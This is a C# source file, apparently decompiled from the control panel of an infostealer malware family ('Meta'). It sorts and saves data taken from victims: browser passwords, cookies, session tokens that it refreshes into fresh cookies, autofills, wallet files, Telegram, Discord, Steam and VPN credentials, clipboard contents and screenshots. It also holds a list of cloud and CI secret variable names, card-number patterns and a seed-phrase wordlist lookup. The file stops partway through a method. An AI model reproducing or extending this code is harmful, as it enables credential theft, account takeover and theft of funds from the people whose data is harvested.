using Meta.MainPanel.Data.Helpers;
using Meta.MainPanel.Views.Old.Actions;
using Meta.SharedModels;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Meta.MainPanel.LogExt;

public static class UserLogExt
{
    public static object InfoLock;

    public static object RdpLock;

    public static object FtpLock;

    public static object ScreenLock;

    public static object PassLock;

    public static object CredLock;

    public static object FillsLock;

    public static object CookieLock;

    public static object DesktopLock;

    public static object WalletLock;

    public static object ProccessLock;

    public static object ProgramsLock;

    [CompilerGenerated]
    private static object c;

    [CompilerGenerated]
    private static readonly object d;

    private static object e;

    private static HeaderParams HeaderPrms
    {
        [CompilerGenerated]
        get
        {
            return (HeaderParams)c;
        }
        [CompilerGenerated]
        set
        {
            c = value;
        }
    }

    private static List<string> MnemWorldList
    {
        [CompilerGenerated]
        get
        {
            return (List<string>)d;
        }
    }

    static UserLogExt()
    {
        InfoLock = new object();
        RdpLock = new object();
        FtpLock = new object();
        ScreenLock = new object();
        PassLock = new object();
        CredLock = new object();
        FillsLock = new object();
        CookieLock = new object();
        DesktopLock = new object();
        WalletLock = new object();
        ProccessLock = new object();
        ProgramsLock = new object();
        c = new HeaderParams(activated: false, null);
        e = new Dictionary<string, string>
        {
            { "Amex Card", "^3[47][0-9]{13}$" },
            { "BCGlobal", "^(6541|6556)[0-9]{12}$" },
            { "Carte Blanche Card", "^389[0-9]{11}$" },
            { "Diners Club Card", "^3(?:0[0-5]|[68][0-9])[0-9]{11}$" },
            { "Discover Card", "6(?:011|5[0-9]{2})[0-9]{12}$" },
            { "Insta Payment Card", "^63[7-9][0-9]{13}$" },
            { "JCB Card", "^(?:2131|1800|35\\\\d{3})\\\\d{11}$" },
            { "KoreanLocalCard", "^9[0-9]{15}$" },
            { "Laser Card", "^(6304|6706|6709|6771)[0-9]{12,15}$" },
            { "Maestro Card", "^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$" },
            { "Mastercard", "5[1-5][0-9]{14}$" },
            { "Solo Card", "^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$" },
            { "Switch Card", "^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$" },
            { "Union Pay Card", "^(62[0-9]{14,17})$" },
            { "Visa Card", "4[0-9]{12}(?:[0-9]{3})?$" },
            { "Visa Master Card", "^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$" },
            { "Express Card", "3[47][0-9]{13}$" }
        };
        try
        {
            d = new WebClient().DownloadString("https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt").Split(new string[2]
            {
                Environment.NewLine,
                "\n"
            }, StringSplitOptions.RemoveEmptyEntries).ToList();
        }
        catch
        {
        }
    }

    public static void SaveTo(this UserLog userLog, HeaderParams headerParams, string dir, List<string> domainDetects, bool writeCounters = false, string domain = null)
    {
        HeaderPrms = headerParams;
        DirectoryInfo directoryInfo = new DirectoryInfo(dir);
        if (!directoryInfo.Exists)
        {
            directoryInfo.Create();
        }
        if (userLog.Country == "?" || userLog.Country == "-")
        {
            userLog.Country = "UNKNOWN";
        }
        if (userLog.PostalCode == "?" || userLog.PostalCode == "-")
        {
            userLog.PostalCode = "UNKNOWN";
        }
        if (userLog.Location.Contains("?") || userLog.Location.Contains("-"))
        {
            userLog.Location = "UNKNOWN";
        }
        DirectoryInfo directoryInfo2;
        if (writeCounters)
        {
            int num = 0;
            int num2 = 0;
            try
            {
                IEnumerable<LoginPair> enumerable = userLog.Credentials.Browsers?.Where((Browser x) => x.Credentials != null)?.SelectMany((Browser x) => x.Credentials);
                if (enumerable != null && enumerable.Count() != 0)
                {
                    try
                    {
                        num = enumerable.Where((LoginPair x) => x.Host.Contains(domain))?.Count() ?? 0;
                    }
                    catch
                    {
                    }
                }
                IEnumerable<Meta.SharedModels.Cookie> enumerable2 = userLog.Credentials.Browsers?.Where((Browser x) => x.Cookies != null)?.SelectMany((Browser x) => x.Cookies);
                if (enumerable2 != null && enumerable2.Count() != 0)
                {
                    try
                    {
                        num2 = enumerable2.Where((Meta.SharedModels.Cookie x) => x.Host.Contains(domain))?.Count() ?? 0;
                    }
                    catch
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
            directoryInfo2 = directoryInfo.CreateSubdirectory($"{userLog.Country}[P{num}_C{num2}][" + userLog.HWID + "] [" + userLog.LogDate.ToString("O").Replace(':', '_') + "]");
        }
        else
        {
            directoryInfo2 = directoryInfo.CreateSubdirectory(userLog.Country + "[" + userLog.HWID + "] [" + userLog.LogDate.ToString("O").Replace(':', '_') + "]");
        }
        if (userLog.Credentials.DebugInfo == null)
        {
            userLog.Credentials.DebugInfo = new List<string>();
        }
        foreach (string item in userLog.Credentials.DebugInfo)
        {
            try
            {
                File.AppendAllText(Path.Combine(directoryInfo2.FullName, "DebugInfo.txt"), item + Environment.NewLine);
            }
            catch
            {
            }
        }
        userLog.Credentials.Browsers?.SaveTo(directoryInfo2, MainFrm.RemoteClientSettings.SaveAsJSON, MainFrm.RemoteClientSettings.AutoRefreshCookies);
        userLog.SaveDomainDetects(directoryInfo2, domainDetects);
        userLog.SaveInfoTo(directoryInfo2);
        if (userLog.Screenshot.IsNotNull() && userLog.Screenshot.Length != 0)
        {
            using MemoryStream stream = new MemoryStream(userLog.Screenshot);
            lock (string.Intern(Path.Combine(directoryInfo2.FullName, "Screenshot.jpg")))
            {
                new Bitmap(stream).Save(Path.Combine(directoryInfo2.FullName, "Screenshot.jpg"), ImageFormat.Jpeg);
            }
        }
        userLog.Credentials.Discord?.SaveDiscordTo(directoryInfo2);
        IEnumerable<Autofill> autofills = userLog.Credentials.Browsers?.Where((Browser x) => x.Autofills != null).SelectMany((Browser x) => x.Autofills);
        userLog.Credentials.SystemEnvironments.SaveTo(directoryInfo2);
        ((IList<Autofill>)smethod_0(autofills)).SaveTo(directoryInfo2);
        userLog.Credentials.ColdWallets?.SaveWalletsTo(directoryInfo2);
        userLog.Credentials.Files?.SaveTo(directoryInfo2);
        userLog.Credentials.FtpConnections?.SaveTo(directoryInfo2);
        userLog.Credentials.InstalledBrowsers?.SaveBrowserInfosTo(directoryInfo2);
        userLog.Credentials.InstalledSoftwares?.SaveProgramsTo(directoryInfo2);
        userLog.Credentials.Processes?.SaveProcessTo(directoryInfo2);
        userLog.Credentials.SteamFiles?.SaveSteamTo(directoryInfo2);
        userLog.Credentials.NordVPN?.SaveNordTo(directoryInfo2);
        userLog.Credentials.OpenVPN?.SaveOpenVpnTo(directoryInfo2);
        userLog.Credentials.ProtonVPN?.SaveProtonTo(directoryInfo2);
        userLog.Credentials.TelegramFiles?.SaveTelegramTo(directoryInfo2);
    }

    public static void SaveTo(this Dictionary<string, string> environments, DirectoryInfo currentLogDirectory)
    {
        try
        {
            string path = Path.Combine(currentLogDirectory.FullName, "SystemVars.txt");
            new StringBuilder().AppendLine(HeaderPrms.Header);
            if (environments == null || environments.Count <= 0)
            {
                return;
            }
            int num = 0;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            stringBuilder.Append(Environment.NewLine);
            foreach (KeyValuePair<string, string> environment in environments)
            {
                stringBuilder.AppendLine("Company: " + GetCompanyName(environment.Key));
                stringBuilder.Append(environment.Key).Append(": ").Append(environment.Value)
                    .Append(Environment.NewLine);
                num++;
            }
            if (!File.Exists(path))
            {
                lock (FillsLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                }
            }
            stringBuilder.Clear();
        }
        catch
        {
        }
    }

    public static string GetCompanyName(string envName)
    {
        Dictionary<string, List<string>> dictionary = new Dictionary<string, List<string>>();
        try
        {
            dictionary.Add("AWS", new List<string> { "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AMAZON_AWS_ACCESS_KEY_ID", "AMAZON_AWS_SECRET_ACCESS_KEY" });
            dictionary.Add("Algolia", new List<string> { "ALGOLIA_API_KEY" });
            dictionary.Add("Azure", new List<string> { "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_USERNAME", "AZURE_PASSWORD", "MSI_ENDPOINT", "MSI_SECRET" });
            dictionary.Add("Binance", new List<string> { "binance_api", "binance_secret" });
            dictionary.Add("Bittrex", new List<string> { "BITTREX_API_KEY", "BITTREX_API_SECRET" });
            dictionary.Add("Cloud Foundry", new List<string> { "CF_PASSWORD", "CF_USERNAME" });
            dictionary.Add("Code Climate", new List<string> { "CODECLIMATE_REPO_TOKEN" });
            dictionary.Add("Coveralls", new List<string> { "COVERALLS_REPO_TOKEN" });
            dictionary.Add("CircleCI", new List<string> { "CIRCLE_TOKEN" });
            dictionary.Add("Digitalocean", new List<string> { "DIGITALOCEAN_ACCESS_TOKEN" });
            dictionary.Add("Dockerhub", new List<string> { "DOCKER_EMAIL", "DOCKER_PASSWORD", "DOCKER_USERNAME", "DOCKERHUB_PASSWORD" });
            dictionary.Add("Fastlane products", new List<string> { "ITC_PASSWORD" });
            dictionary.Add("Facebook", new List<string> { "FACEBOOK_APP_ID", "FACEBOOK_APP_SECRET", "FACEBOOK_ACCESS_TOKEN" });
            dictionary.Add("Firebase", new List<string> { "FIREBASE_TOKEN" });
            dictionary.Add("Fossa", new List<string> { "FOSSA_API_KEY" });
            dictionary.Add("Github", new List<string> { "GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN", "GITHUB_ENTERPRISE_TOKEN" });
            dictionary.Add("Gitlab", new List<string> { "CI_DEPLOY_PASSWORD", "CI_DEPLOY_USER", "GITLAB_USER_LOGIN", "CI_JOB_JWT", "CI_JOB_JWT_V2", "CI_JOB_TOKEN" });
            dictionary.Add("Google Cloud", new List<string> { "GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_API_KEY" });
            dictionary.Add("Heroku", new List<string> { "HEROKU_API_KEY", "HEROKU_API_USER" });
            dictionary.Add("Mailgun", new List<string> { "MAILGUN_API_KEY" });
            dictionary.Add("MongoDB", new List<string> { "MCLI_PRIVATE_API_KEY", "MCLI_PUBLIC_API_KEY" });
            dictionary.Add("NGROK", new List<string> { "NGROK_TOKEN", "NGROK_AUTH_TOKEN" });
            dictionary.Add("NPM", new List<string> { "NPM_TOKEN", "NPM_AUTH_TOKEN" });
            dictionary.Add("OKTA", new List<string> { "OKTA_CLIENT_ORGURL", "OKTA_CLIENT_TOKEN", "OKTA_OAUTH2_CLIENTSECRET", "OKTA_OAUTH2_CLIENTID", "OKTA_AUTHN_GROUPID" });
            dictionary.Add("Oracle OpenStack command-line client", new List<string> { "OS_USERNAME", "OS_PASSWORD" });
            dictionary.Add("Percy.io", new List<string> { "PERCY_TOKEN" });
            dictionary.Add("Sauce Labs", new List<string> { "SAUCE_ACCESS_KEY", "SAUCE_USERNAME" });
            dictionary.Add("Sentry", new List<string> { "SENTRY_AUTH_TOKEN" });
            dictionary.Add("Slack", new List<string> { "SLACK_TOKEN" });
            dictionary.Add("Square", new List<string> { "square_access_token", "square_oauth_secret" });
            dictionary.Add("Stripe", new List<string> { "STRIPE_API_KEY", "STRIPE_DEVICE_NAME" });
            dictionary.Add("Surge", new List<string> { "SURGE_TOKEN", "SURGE_LOGIN" });
            dictionary.Add("Twilio", new List<string> { "TWILIO_ACCOUNT_SID", "TWILIO_AUTH_TOKEN" });
            dictionary.Add("Twitter", new List<string> { "CONSUMER_KEY", "CONSUMER_SECRET" });
            dictionary.Add("Travis Ci", new List<string> { "TRAVIS_SUDO", "TRAVIS_OS_NAME", "TRAVIS_SECURE_ENV_VARS" });
            dictionary.Add("Vault HashiCorp", new List<string> { "VAULT_TOKEN", "VAULT_CLIENT_KEY" });
            dictionary.Add("Vultr", new List<string> { "TOKEN", "VULTR_ACCESS", "VULTR_SECRET" });
            foreach (KeyValuePair<string, List<string>> item in dictionary)
            {
                if (item.Value.Contains(envName))
                {
                    return item.Key;
                }
            }
        }
        catch
        {
        }
        return "Unknown";
    }

    public static void SaveDomainDetects(this UserLog user, DirectoryInfo currentLogDirectory, List<string> domainDetects)
    {
        try
        {
            List<string> list = new List<string>();
            List<string> list2 = new List<string>();
            string empty = string.Empty;
            foreach (string domainDetect in domainDetects)
            {
                try
                {
                    string[] links = domainDetect.Split('=')[1].Split('|');
                    foreach (string item in user.PasswordContains(links).IsNull(new List<string>()))
                    {
                        list.Add("[" + domainDetect.Split('=')[0] + "] " + item);
                    }
                    foreach (string item2 in user.CookiesContains(links).IsNull(new List<string>()))
                    {
                        list2.Add("[" + domainDetect.Split('=')[0] + "] " + item2);
                    }
                }
                catch
                {
                }
            }
            list = (from x in list.Distinct()
                    where !string.IsNullOrWhiteSpace(x)
                    select x).ToList();
            list2 = (from x in list2.Distinct()
                     where !string.IsNullOrWhiteSpace(x)
                     select x).ToList();
            if (list.Count() != 0)
            {
                empty = empty + "PDD: " + Environment.NewLine;
                foreach (string item3 in list)
                {
                    empty = empty + item3 + ", ";
                }
                empty = empty.TrimEnd(',', ' ') + Environment.NewLine;
            }
            else
            {
                empty = empty + "PDD: NOT FOUND" + Environment.NewLine + Environment.NewLine;
            }
            if (list2.Count() != 0)
            {
                empty = empty + "CDD: " + Environment.NewLine;
                foreach (string item4 in list2)
                {
                    empty = empty + item4 + ", ";
                }
                empty = empty.TrimEnd(',', ' ') + Environment.NewLine;
            }
            else
            {
                empty = empty + "CDD: NOT FOUND" + Environment.NewLine + Environment.NewLine;
            }
            File.WriteAllText(Path.Combine(currentLogDirectory.FullName, "DomainDetects.txt"), empty);
        }
        catch
        {
        }
    }

    public static void SaveTelegramTo(this IList<RemoteFile> telegramFiles, DirectoryInfo currentLogDirectory)
    {
        try
        {
            foreach (RemoteFile telegramFile in telegramFiles)
            {
                if (!telegramFile.FileName.IsNotNull() || telegramFile.Body.IsNull(new byte[0]).Length == 0)
                {
                    continue;
                }
                DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "Telegram"));
                if (!directoryInfo.Exists)
                {
                    directoryInfo.Create();
                }
                string empty = string.Empty;
                if (string.IsNullOrWhiteSpace(telegramFile.FileDirectory))
                {
                    empty = directoryInfo.FullName;
                }
                else
                {
                    empty = Path.Combine(directoryInfo.FullName, telegramFile.FileDirectory);
                    if (!Directory.Exists(empty))
                    {
                        Directory.CreateDirectory(empty);
                    }
                }
                lock (DesktopLock)
                {
                    File.WriteAllBytes(Path.Combine(empty, telegramFile.FileName), telegramFile.Body);
                }
            }
        }
        catch (Exception)
        {
        }
    }

    public static void SaveProtonTo(this IList<RemoteFile> protonVpnFiles, DirectoryInfo currentLogDirectory)
    {
        try
        {
            foreach (RemoteFile protonVpnFile in protonVpnFiles)
            {
                if (!protonVpnFile.FileName.IsNotNull() || protonVpnFile.Body.IsNull(new byte[0]).Length == 0)
                {
                    continue;
                }
                DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "ProtonVPN"));
                if (!directoryInfo.Exists)
                {
                    directoryInfo.Create();
                }
                string empty = string.Empty;
                if (string.IsNullOrWhiteSpace(protonVpnFile.FileDirectory))
                {
                    empty = directoryInfo.FullName;
                }
                else
                {
                    empty = Path.Combine(directoryInfo.FullName, protonVpnFile.FileDirectory);
                    if (!Directory.Exists(empty))
                    {
                        Directory.CreateDirectory(empty);
                    }
                }
                lock (DesktopLock)
                {
                    File.WriteAllBytes(Path.Combine(empty, protonVpnFile.FileName), protonVpnFile.Body);
                }
            }
        }
        catch (Exception)
        {
        }
    }

    public static void SaveOpenVpnTo(this IList<RemoteFile> openVpnFiles, DirectoryInfo currentLogDirectory)
    {
        try
        {
            if (openVpnFiles.Count <= 0)
            {
                return;
            }
            DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "OpenVPN\\profiles"));
            if (!directoryInfo.Exists)
            {
                directoryInfo.Create();
            }
            foreach (RemoteFile openVpnFile in openVpnFiles)
            {
                File.WriteAllBytes(Path.Combine(directoryInfo.FullName, openVpnFile.FileName), openVpnFile.Body);
            }
        }
        catch
        {
        }
    }

    public static void SaveNordTo(this IList<LoginPair> credentialsVpn, DirectoryInfo currentLogDirectory)
    {
        try
        {
            if (credentialsVpn.Count <= 0)
            {
                return;
            }
            DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(currentLogDirectory.FullName, "NordVPN"));
            if (!directoryInfo.Exists)
            {
                directoryInfo.Create();
            }
            string path = Path.Combine(directoryInfo.FullName, "Credentials.txt");
            int num = 0;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            stringBuilder.Append(Environment.NewLine);
            foreach (LoginPair item in credentialsVpn)
            {
                stringBuilder.Append("Username: ").Append(item.Login).Append(Environment.NewLine)
                    .Append("Password: ")
                    .Append(item.Password)
                    .Append(Environment.NewLine)
                    .Append((num < credentialsVpn.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
                num++;
            }
            if (!File.Exists(path))
            {
                lock (FtpLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                }
            }
            stringBuilder.Clear();
        }
        catch
        {
        }
    }

    public static void SaveTo(this IList<Autofill> autofills, DirectoryInfo currentLogDirectory)
    {
        try
        {
            string path = Path.Combine(currentLogDirectory.FullName, "ImportantAutofills.txt");
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            bool flag = false;
            if (autofills != null && autofills.Count > 0)
            {
                int num = 0;
                StringBuilder stringBuilder2 = new StringBuilder();
                stringBuilder2.AppendLine(HeaderPrms.Header);
                stringBuilder2.Append(Environment.NewLine);
                foreach (Autofill autofill in autofills)
                {
                    stringBuilder2.Append(autofill.Name).Append(": ").Append(autofill.Value)
                        .Append(Environment.NewLine);
                    num++;
                }
                if (!File.Exists(path))
                {
                    lock (FillsLock)
                    {
                        File.WriteAllText(path, stringBuilder2.ToString());
                    }
                }
                stringBuilder2.Clear();
            }
            if (flag && !File.Exists(path))
            {
                lock (PassLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                    return;
                }
            }
        }
        catch
        {
        }
    }

    public static void SaveWalletsTo(this IList<RemoteFile> coldWallets, DirectoryInfo currentLogDirectory)
    {
        try
        {
            foreach (RemoteFile coldWallet in coldWallets)
            {
                try
                {
                    if (!coldWallet.FileName.IsNotNull() || coldWallet.Body.IsNull(new byte[0]).Length == 0)
                    {
                        continue;
                    }
                    DirectoryInfo directoryInfo = currentLogDirectory.CreateSubdirectory("Wallets");
                    string text = directoryInfo.FullName + "\\" + coldWallet.FileDirectory;
                    if (!Directory.Exists(text))
                    {
                        Directory.CreateDirectory(text);
                    }
                    if (!Directory.Exists(text))
                    {
                        continue;
                    }
                    lock (WalletLock)
                    {
                        if ((text + "\\" + coldWallet.FileName).Length < 256)
                        {
                            File.WriteAllBytes(text + "\\" + coldWallet.FileName, coldWallet.Body);
                            continue;
                        }
                        text = directoryInfo.FullName + "\\TooLongDir";
                        if (!Directory.Exists(text))
                        {
                            Directory.CreateDirectory(text);
                            File.WriteAllBytes(text + "\\" + coldWallet.FileName, coldWallet.Body);
                        }
                    }
                }
                catch (Exception)
                {
                }
            }
        }
        catch (Exception)
        {
        }
    }

    public static void SaveProcessTo(this IList<string> processList, DirectoryInfo currentLogDirectory)
    {
        try
        {
            if (processList == null || processList.Count == 0)
            {
                return;
            }
            string path = Path.Combine(currentLogDirectory.FullName, "ProcessList.txt");
            if (File.Exists(path))
            {
                File.Delete(path);
            }
            int num = 0;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            stringBuilder.Append(Environment.NewLine);
            foreach (string process in processList)
            {
                stringBuilder.Append(process).Append(Environment.NewLine).Append((num < processList.Count - 1) ? (new string('=', 15) + Environment.NewLine) : string.Empty);
                num++;
            }
            if (!File.Exists(path))
            {
                lock (ProccessLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                }
            }
            stringBuilder.Clear();
        }
        catch
        {
        }
    }

    public static void SaveProgramsTo(this IList<string> installedPrograms, DirectoryInfo currentLogDirectory)
    {
        try
        {
            if (installedPrograms == null || installedPrograms.Count == 0)
            {
                return;
            }
            string path = Path.Combine(currentLogDirectory.FullName, "InstalledSoftware.txt");
            if (File.Exists(path))
            {
                File.Delete(path);
            }
            int num = 1;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            stringBuilder.Append(Environment.NewLine);
            foreach (string installedProgram in installedPrograms)
            {
                stringBuilder.Append(num++).Append(") ").Append(installedProgram)
                    .Append(Environment.NewLine);
            }
            if (!File.Exists(path))
            {
                lock (ProgramsLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                }
            }
            stringBuilder.Clear();
        }
        catch
        {
        }
    }

    public static void SaveBrowserInfosTo(this IList<InstalledBrowserInfo> installedPrograms, DirectoryInfo currentLogDirectory)
    {
        try
        {
            if (installedPrograms == null || installedPrograms.Count == 0)
            {
                return;
            }
            string path = Path.Combine(currentLogDirectory.FullName, "InstalledBrowsers.txt");
            if (File.Exists(path))
            {
                File.Delete(path);
            }
            int num = 1;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            stringBuilder.Append(Environment.NewLine);
            foreach (InstalledBrowserInfo installedProgram in installedPrograms)
            {
                stringBuilder.Append(num++).Append(") Name: " + installedProgram.Name + ", Path: " + installedProgram.Path + ", Version: " + installedProgram.Version).Append(Environment.NewLine);
            }
            if (!File.Exists(path))
            {
                lock (ProgramsLock)
                {
                    File.WriteAllText(path, stringBuilder.ToString());
                }
            }
            stringBuilder.Clear();
        }
        catch
        {
        }
    }

    public static void SaveInfoTo(this UserLog ClientInformation, DirectoryInfo currentLogDirectory)
    {
        string path = Path.Combine(currentLogDirectory.FullName, "UserInformation.txt");
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.AppendLine(HeaderPrms.Header);
        stringBuilder.Append(Environment.NewLine);
        stringBuilder.Append("Build ID: ").AppendLine(ClientInformation.BuildID.IsNull("UNKNOWN"));
        stringBuilder.Append("IP: ").AppendLine(ClientInformation.IP.IsNull("UNKNOWN"));
        stringBuilder.Append("FileLocation: ").AppendLine(ClientInformation.FileLocation.IsNull("UNKNOWN"));
        stringBuilder.Append("UserName: ").AppendLine(ClientInformation.Username.IsNull("UNKNOWN"));
        stringBuilder.Append("MachineName: ").AppendLine(ClientInformation.MachineName);
        stringBuilder.Append("Country: ").AppendLine(ClientInformation.Country.IsNull("UNKNOWN"));
        stringBuilder.Append("Zip Code: ").AppendLine(ClientInformation.PostalCode.IsNull("UNKNOWN"));
        stringBuilder.Append("Location: ").AppendLine(ClientInformation.Location.IsNull("UNKNOWN"));
        stringBuilder.Append("HWID: ").AppendLine(ClientInformation.HWID.IsNull("UNKNOWN"));
        stringBuilder.Append("Current Language: ").AppendLine(ClientInformation.CurrentLanguage.IsNull("UNKNOWN"));
        stringBuilder.Append("ScreenSize: ").AppendLine(ClientInformation.MonitorSize.IsNull("UNKNOWN"));
        stringBuilder.Append("TimeZone: ").AppendLine(ClientInformation.TimeZone.IsNull("UNKNOWN"));
        stringBuilder.Append("Operation System: ").AppendLine(ClientInformation.OS.IsNull("UNKNOWN"));
        stringBuilder.Append("Log date: ").AppendLine(ClientInformation.LogDate.ToString());
        IList<string> languages = ClientInformation.Credentials.Languages;
        if (languages != null && languages.Count > 0)
        {
            stringBuilder.AppendLine();
            stringBuilder.AppendLine("Available KeyboardLayouts: ");
            foreach (string language in ClientInformation.Credentials.Languages)
            {
                stringBuilder.AppendLine(language);
            }
            stringBuilder.AppendLine();
        }
        IList<Hardware> hardwares = ClientInformation.Credentials.Hardwares;
        if (hardwares != null && hardwares.Count > 0)
        {
            stringBuilder.AppendLine();
            stringBuilder.AppendLine("Hardwares: ");
            foreach (string item in ClientInformation.Credentials.Hardwares.Select((Hardware x) => x.ToString()))
            {
                stringBuilder.AppendLine(item);
            }
            stringBuilder.AppendLine();
        }
        IList<string> defenders = ClientInformation.Credentials.Defenders;
        if (defenders != null && defenders.Count > 0)
        {
            stringBuilder.AppendLine();
            stringBuilder.AppendLine("Anti-Viruses: ");
            foreach (string defender in ClientInformation.Credentials.Defenders)
            {
                stringBuilder.AppendLine(defender);
            }
        }
        if (!File.Exists(path))
        {
            lock (InfoLock)
            {
                File.WriteAllText(path, stringBuilder.ToString());
            }
        }
        path = Path.Combine(currentLogDirectory.FullName, "Clipboard.txt");
        if (!string.IsNullOrWhiteSpace(ClientInformation.Clipboard))
        {
            File.WriteAllText(path, ClientInformation.Clipboard);
        }
        stringBuilder.Clear();
    }

    public static void SaveTo(this IList<Browser> BrowserProfiles, DirectoryInfo currentLogDirectory, bool saveJson, bool refreshCookies)
    {
        try
        {
            string path = Path.Combine(currentLogDirectory.FullName, "Passwords.txt");
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine(HeaderPrms.Header);
            bool flag = false;
            foreach (Browser BrowserProfile in BrowserProfiles)
            {
                try
                {
                    if (BrowserProfile.IsEmpty())
                    {
                        continue;
                    }
                    if (!string.IsNullOrWhiteSpace(BrowserProfile.UserAgent) && BrowserProfile.UserAgent != "UNKNOWN")
                    {
                        try
                        {
                            string text = null;
                            text = ((!BrowserProfile.Name.Contains("\\")) ? (currentLogDirectory.FullName + "\\UserAgents\\" + BrowserProfile.Name + ".txt") : (currentLogDirectory.FullName + "\\UserAgents\\" + BrowserProfile.Name.Split('\\').Last() + ".txt"));
                            if (!File.Exists(text))
                            {
                                lock (FtpLock)
                                {
                                    currentLogDirectory.CreateSubdirectory("UserAgents");
                                    File.WriteAllText(text, BrowserProfile.UserAgent);
                                }
                            }
                        }
                        catch
                        {
                        }
                    }
                    if (BrowserProfile.AccountDetails != null && !string.IsNullOrWhiteSpace(BrowserProfile.AccountDetails.Token))
                    {
                        try
                        {
                            string text2 = null;
                            text2 = (BrowserProfile.Name.Contains("\\") ? (currentLogDirectory.FullName + "\\Restore\\" + BrowserProfile.Name.Split('\\').Last() + "_" + BrowserProfile.Profile.Replace(" Network", string.Empty).Replace(" Extension", string.Empty) + " Token.txt") : (currentLogDirectory.FullName + "\\Restore\\" + BrowserProfile.Name + "_" + BrowserProfile.Profile.Replace(" Network", string.Empty).Replace(" Extension", string.Empty) + " Token.txt"));
                            if (!File.Exists(text2))
                            {
                                lock (CookieLock)
                                {
                                    currentLogDirectory.CreateSubdirectory("Restore");
                                    File.WriteAllText(text2, BrowserProfile.AccountDetails.Token + ":" + BrowserProfile.AccountDetails.Id);
                                    if (refreshCookies)
                                    {
                                        try
                                        {
                                            List<Meta.SharedModels.Cookie> list = CookieHelper.Refresh(BrowserProfile.AccountDetails.Token + ":" + BrowserProfile.AccountDetails.Id);
                                            if (list.Count > 0)
                                            {
                                                text2 = (BrowserProfile.Name.Contains("\\") ? (currentLogDirectory.FullName + "\\Restore\\" + BrowserProfile.Name.Split('\\').Last() + "_" + BrowserProfile.Profile.Replace(" Network", string.Empty).Replace(" Extension", string.Empty) + " Fresh Cookies.txt") : (currentLogDirectory.FullName + "\\Restore\\" + BrowserProfile.Name + "_" + BrowserProfile.Profile.Replace(" Network", string.Empty).Replace(" Extension", string.Empty) + " Fresh Cookies.txt"));
                                                File.WriteAllText(text2, saveJson ? list.CookiesToJSON() : string.Join(Environment.NewLine, list.Select((Meta.SharedModels.Cookie x) => x.ToText())));
                                            }
                                        }
                                        catch (Exception)
                                        {
                                        }
                                    }
                                }
                            }
                        }
                        catch
                        {
                        }
                    }
                    IList<Meta.SharedModels.Cookie> cookies = BrowserProfile.Cookies;
                    if (cookies != null && cookies.Count > 0)
                    {
                        currentLogDirectory.CreateSubdirectory("Cookies");
                        string text3 = null;
                        text3 = ((!BrowserProfile.Name.Contains("\\")) ? (currentLogDirectory.FullName + "\\Cookies\\" + BrowserProfile.Name + "_" + BrowserProfile.Profile + ".txt") : (currentLogDirectory.FullName + "\\Cookies\\" + BrowserProfile.Name.Split('\\').Last() + "_" + BrowserProfile.Profile + ".txt"));
                        if (!File.Exists(text3))
                        {
                            lock (CookieLock)
                            {
                                if (saveJson)
                                {
                                    File.WriteAllText(text3, BrowserProfile.Cookies.CookiesToJSON());
                                }
                                else
                                {
                                    File.WriteAllLines(text3, BrowserProfile.Cookies.Select((Meta.SharedModels.Cookie x) => x.ToText()));
                                }
                            }
                        }
                    }
                    IList<LoginPair> credentials = BrowserProfile.Credentials;
                    if (credentials != null && credentials.Count > 0)
                    {
                        int num = 0;
                        flag = true;
                        stringBuilder.Append(Environment.NewLine);
                        foreach (LoginPair credential in BrowserProfile.Credentials)
                        {
                            stringBuilder.Append("URL: ").Append(credential.Host).Append(Environment.NewLine)
                                .Append("Username: ")
                                .Append(credential.Login)
                                .Append(Environment.NewLine)
                                .Append("Password: ")
                                .Append(credential.Password)
                                .Append(Environment.NewLine)
                                .Append("Application: ")
                                .Append(BrowserProfile.Name + "_" + BrowserProfile.Profile)
                                .Append(Environment.NewLine)
                                .Append(new string('=', 15))
                                .Append(Environment.NewLine);
                            num++;
                        }
                    }
                    IList<Autofill> autofills = BrowserProfile.Autofills;
                    if (autofills != null && autofills.Count > 0)
                    {
                        DirectoryInfo directoryInfo = currentLogDirectory.CreateSubdirectory("Autofills");
